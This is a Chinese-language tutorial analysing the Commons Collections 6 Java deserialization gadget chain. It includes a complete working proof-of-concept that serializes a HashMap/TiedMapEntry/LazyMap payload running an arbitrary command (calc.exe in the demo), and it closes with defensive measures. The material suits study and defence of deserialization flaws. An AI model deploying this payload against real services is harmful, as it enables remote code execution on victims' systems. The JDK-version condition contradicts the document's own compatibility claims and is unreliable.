# CC6 HashMap反序列化链分析

## 利用链概述

CC6（Commons Collections 6）是Apache Commons Collections库中的一个反序列化漏洞利用链，它通过HashMap的readObject方法触发，最终执行任意命令。与CC1使用AnnotationInvocationHandler不同，CC6使用HashMap作为入口点，具有更好的兼容性。

## 完整调用链

```
HashMap.readObject()
    → HashMap.hash() 
        → TiedMapEntry.hashCode()
            → TiedMapEntry.getValue()
                → LazyMap.get()
                    → InvokerTransformer.transform()
                        → Runtime.exec()
```

## 关键代码分析

### 1. HashMap的readObject方法

```java
private void readObject(java.io.ObjectInputStream s)  
    throws IOException, ClassNotFoundException {
        
    s.defaultReadObject();  //恢复对象的状态，static/transient字段除外
    reinitialize(); //重置HashMap
    if (loadFactor <= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException("Illegal load factor: " +
                                             loadFactor);
    s.readInt();    //将二进制文件或网络流读取结构化数据，且必须按顺序读取（这里传进去的应该是序列化数据）            
    int mappings = s.readInt();  //用于获取读取到的键值对数量
    if (mappings < 0)
        throw new InvalidObjectException("Illegal mappings count: " +
                                             mappings);
    else if (mappings > 0) {   //这里肯定要进去，必须有map容器
        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
        float fc = (float)mappings / lf + 1.0f;
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                    DEFAULT_INITIAL_CAPACITY :
                    (fc >= MAXIMUM_CAPACITY) ?
                    MAXIMUM_CAPACITY :
                    tableSizeFor((int)fc));
        float ft = (float)cap * lf;
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                     (int)ft : Integer.MAX_VALUE);
        @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
        table = tab;

        for (int i = 0; i < mappings; i++) {
            @SuppressWarnings("unchecked")
                K key = (K) s.readObject(); //反序列化key
            @SuppressWarnings("unchecked")
                V value = (V) s.readObject(); //反序列化value
            putVal(hash(key), key, value, false, false); //这里是关键点，因为会执行hash(key)
        }
    }
}
```

**关键点**：在反序列化每个键值对时，会调用`hash(key)`计算key的哈希值。

### 2. HashMap的hash()方法

```java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

这里传入的key不等于NULL，就可以执行key.hashCode。

### 3. TiedMapEntry的hashCode()方法

```java
public int hashCode() {
    Object value = getValue(); //这里执行了一个getValue()
    return (getKey() == null ? 0 : getKey().hashCode()) ^
            (value == null ? 0 : value.hashCode()); 
}
```

看到这里我想这个key的取值应该明了了，key = TiedMapEntry。
有点提示就是getValue对象，找找看。

### 4. TiedMapEntry的getValue()方法

```java
public Object getValue() {
    return map.get(key);
}

public TiedMapEntry(Map map, Object key) {  //这个map和上面那个map一样，都应该是LazyMap
    super();
    this.map = map;
    this.key = key;
}
```

这里又执行了一个get()，这个map是通过TiedMapEntry对象传入的，接下来要看看是用的哪个get()，找到LazyMap类。

### 5. LazyMap的get()方法

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {  //检测key是否存在，不存在才能触发攻击链
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

既然找到了LazyMap类，那么这个 map = LazyMap 了。然后看到了熟悉的transform()，了解过CC1链就知道，这里要用到InvokerTransformer.transform()。来看看factory从何而来。

### 6. LazyMap的创建

```java
public static Map decorate(Map map, Factory factory) {
    return new LazyMap(map, factory);
}

protected LazyMap(Map map, Factory factory) {
    super(map);
    if (factory == null) {
        throw new IllegalArgumentException("Factory must not be null");
    }
    this.factory = FactoryTransformer.getInstance(factory);
}
```

完美了，调用LazyMap.decorate()，然后令factory = InvokerTransformer。
剩下的就和CC1链一样了。

## 完整POC代码

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6POC {
    public static void main(String[] args) throws Exception {
        System.out.println("=== CC6链POC演示 ===\n");
        
        // 1. 构造Transformer链（与CC1链一致）
        Transformer[] transformerArray = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", 
                    new Class[]{String.class, Class[].class}, 
                    new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", 
                    new Class[]{Object.class, Object[].class}, 
                    new Object[]{null, null}),
                new InvokerTransformer("exec", 
                    new Class[]{String.class}, 
                    new Object[]{"calc.exe"})  // Windows计算器
        };
        
        // 这里是反射法构造命令，与CC1链一致。
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformerArray);
        
        // 2. 创建LazyMap
        Map innerMap = new HashMap<>();
        // 因为只要我们的序列化中有map，就会被HashMap处理。
        Map lazyMap = LazyMap.decorate(innerMap, new ConstantTransformer(1));
        // 先使用一个无害的Transformer，后面通过反射替换
        
        // 3. 创建TiedMapEntry
        // 当执行hashCode()的时候，会去执行getValue()，也就是lazyMap.get("key_trigger")
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "key_trigger"); 
        
        // 4. 创建HashMap并添加恶意entry
        HashMap map2 = new HashMap();
        map2.put(entry, "value");
        // 这里的put()会先执行hash(entry)，hash(entry)的key不为空就执行entry.hashCode()
        
        // 5. 关键：移除LazyMap中的"key_trigger"键
        innerMap.remove("key_trigger");
        // get()中的key得是空的，才执行transform()
        
        // 6. 通过反射将LazyMap的factory替换为恶意Transformer链
        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, chainedTransformer);
        
        // 7. 序列化
        System.out.println("开始序列化...");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map2);
        oos.close();
        
        byte[] payload = baos.toByteArray();
        System.out.println("序列化完成，payload大小: " + payload.length + " 字节\n");
        
        // 8. 反序列化（触发漏洞）
        System.out.println("开始反序列化，即将弹出计算器...");
        ByteArrayInputStream bais = new ByteArrayInputStream(payload);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();  // 触发！
        ois.close();
        
        System.out.println("反序列化完成");
    }
}
```

## POC代码关键点解释

1. **为什么先使用ConstantTransformer(1)**：在构造LazyMap时，我们先使用一个无害的Transformer（ConstantTransformer(1)），这是为了避免在构造过程中提前触发恶意代码。后面通过反射替换为真正的恶意Transformer链。

2. **为什么需要remove("key_trigger")**：LazyMap的get()方法只有在key不存在时才会调用factory.transform()。所以在序列化前，我们需要确保"key_trigger"不在map中。

3. **反射替换factory的原因**：如果直接在创建LazyMap时使用恶意Transformer链，那么在构造TiedMapEntry时就会触发漏洞。通过反射替换，我们可以控制触发时机。

## 利用条件

1. **Apache Commons Collections版本**：3.1 - 3.2.1（在3.2.2中部分修复）
2. **JDK版本**：CC6链在JDK 8u71之前有效，因为HashMap的readObject实现在后续版本有所变化
3. **依赖库**：需要commons-collections库在classpath中
4. **安全限制**：需要禁用安全管理器或具有执行命令的权限

## CC6与CC1链的比较

| 特性 | CC1链 | CC6链 |
|------|-------|-------|
| **入口类** | AnnotationInvocationHandler | HashMap |
| **触发方式** | readObject中遍历Map调用setValue | readObject中计算key的hashCode |
| **兼容性** | 受JDK版本限制较大 | 兼容性更好，HashMap更通用 |
| **利用复杂度** | 较复杂，需要反射创建内部类 | 相对简单，使用标准类 |
| **适用场景** | 早期JDK版本 | 更广泛的JDK版本 |

## CC6链的优势

1. **更好的兼容性**：HashMap是Java标准库的一部分，几乎所有Java应用都会使用
2. **绕过限制**：在某些环境中，AnnotationInvocationHandler可能被过滤，但HashMap很少被过滤
3. **更稳定**：HashMap的readObject方法在不同JDK版本中变化较小

## 防御措施

1. **升级Commons Collections**：升级到3.2.2或更高版本
2. **使用安全反序列化**：使用ObjectInputFilter限制反序列化的类
3. **代码审计**：检查代码中是否存在不安全的反序列化操作
4. **WAF/IDS规则**：检测和拦截包含恶意序列化数据的请求

## 总结

CC6链通过HashMap的readObject方法触发，利用TiedMapEntry和LazyMap的联动，最终执行InvokerTransformer中的恶意代码。与CC1链相比，CC6具有更好的兼容性和实用性，是实际渗透测试中常用的利用链之一。

理解CC6链的关键在于掌握：
1. HashMap反序列化时如何触发hash()方法
2. TiedMapEntry如何将hashCode()调用转发到LazyMap.get()
3. LazyMap如何通过Transformer工厂执行任意代码
4. 如何构造完整的利用链并绕过各种限制

通过分析CC6链，我们可以更好地理解Java反序列化漏洞的原理，并采取有效措施进行防御。